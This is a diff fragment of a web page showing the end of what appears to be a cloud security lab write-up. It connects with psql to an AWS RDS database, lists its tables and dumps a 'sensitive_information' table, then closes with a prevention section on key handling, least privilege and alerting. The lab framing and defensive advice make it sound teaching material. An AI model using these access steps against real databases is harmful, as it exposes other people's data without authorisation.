+</span></span><span style=display:flex><span> <span style=color:#0c6>&#34;MasterUserPassword&#34;</span>: <span style=color:#0c6>&#34;****&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#2c5dcd>}</span>,
+</span></span></code></pre></td></tr></table></div></div><p>Now lets try to connect to our RDS instance one more time.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>psql postgresql://cgadmin@yogidbinstance.cq9megh2xpgg.us-east-1.rds.amazonaws.com:5432/postgres
+</span></span></code></pre></td></tr></table></div></div><p>We can list the databases with <code>\l</code></p><p><img src=images/postgres-list.png alt=postgres_list class=img-fluid></p><p>Looking at the output, the securedb looks interesting. Lets connect to it, list the tables, and print it all to the screen.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-postgres data-lang=postgres><span style=display:flex><span><span style=color:#fff;background-color:#c00>\</span>c securedb
+</span></span><span style=display:flex><span><span style=color:#fff;background-color:#c00>\</span>dt
+</span></span><span style=display:flex><span><span style=color:#2c5dcd;font-weight:700>SELECT</span> <span style=color:#2c5dcd>*</span> <span style=color:#2c5dcd;font-weight:700>FROM</span> sensitive_information;
+</span></span></code></pre></td></tr></table></div></div><p><img src=images/victory.png alt=victory.png class=img-fluid></p><p>Awesome! We succesfull gained access to the secret information within the RDS database.</p><hr><h3 id=alternative-path>Alternative Path</h3><p>There is another way to gain access to the secrets held in the database. I have not worked through that path. Once I do I will update this document.</p><hr><h3 id=prevention>Prevention</h3><p>Where did the owner of this account go wrong? There are a few places where this attack could have be stopped. Lets dive into them.</p><ol><li>Our initial access was through the solo user. Does that user need static keys? If they could be switched to temorary ephemeral keys it would greatly reduce the liklihood that if an attacker found the keys that they would still be valid.</li><li>Does solo need access to codebuild? Chances are they do, the permissions seemed to be fairly tightly scoped around that service. But if they do not, removing those capabilities would be good.</li><li>Within the codebuild project we came across keys for the calrissian user. Those keys should not exist within this project. Assuming the keys were placed there to grant the Linux container associated with this project access to RDS or other portions of AWS, there are better ways to do this. Assigning a role to the node where the container lives would be the best option. If the container does not live within aws, using a secrets manager is the next best thing.</li><li>The calrissian user seemed to have a mismash of permissions in RDS. If these permission are not all required they should be removed. Specifically the modify-db-instance, and create-db-snapshot permissions.</li></ol><p>By fixing one of these things or all of them, it would have effected our ability to access the secret data within the database.</p><p>From a logging and alerting point of view, we probably made several commands that were not &rsquo;normal&rsquo; for the solo and calrissian users to make. By alerting on this odd activity the response team could have detected us and shut the attack down. Additionally if there would have been a configuration management solution to monitor for RDS instances being made public and preventing it. It would have made our attack much more complicated.</p></div></div><div class=col-md-3 id=sidebar data-spy=affix-bottom data-offset-top=0><nav class="post-sidebar hidden-print hidden-sm hidden-xs affix sticky" id=post-nav><h5>contents</h5><ul class="nav post-sidenav"><li><nav id=TableOfContents><ul><li><ul><li><a href=#who-are-we>Who are we?</a></li><li><a href=#what-can-we-do>What can we do?</a></li><li><a href=#additional-service-enumeration>Additional Service Enumeration</a></li><li><a href=#codebuild-enum>Codebuild Enum</a></li><li><a href=#codebuild-manual-enumeration>Codebuild Manual Enumeration</a></li><li><a href=#calrissian>Calrissian</a></li><li><a href=#our-own-db>Our own DB</a></li><li><a href=#alternative-path>Alternative Path</a></li><li><a href=#prevention>Prevention</a></li></ul></li></ul></nav></li></ul></nav></div></div></div></div><footer></footer></body><script src=https://code.jquery.com/jquery-3.3.1.slim.min.js integrity=sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo crossorigin=anonymous></script>
 <script src=https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js integrity=sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1 crossorigin=anonymous></script>
 <script src=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js integrity=sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM crossorigin=anonymous></script>
-<script>includeHTML()</script>
-</html>
+<script>includeHTML()</script></html>
